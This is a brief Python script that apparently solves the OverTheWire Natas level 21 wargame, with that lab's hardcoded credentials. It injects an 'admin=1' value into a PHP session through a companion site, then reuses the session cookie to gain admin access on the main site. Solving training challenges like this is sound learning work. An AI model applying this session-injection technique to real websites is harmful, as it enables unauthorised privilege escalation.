#!/usr/bin/python3
# Time: 2019/04/23 3:47 PM


import re
import time
import requests
import base64
import codecs




username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
url = f'http://{username}.natas.labs.overthewire.org/?debug=true'
ex = "http://natas21-experimenter.natas.labs.overthewire.org/"

# url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()


resp = s.post(ex, auth=(username, password), data={"submit": "1", "admin": 1})
print(resp.text)
print("**"*40)
old_sid = s.cookies["PHPSESSID"]
# PHPSESSID=768c771r770kjrv28h73cgdtm5

res2 = s.get(url, cookies={"PHPSESSID": old_sid}, auth=(username, password))
print(res2.text)


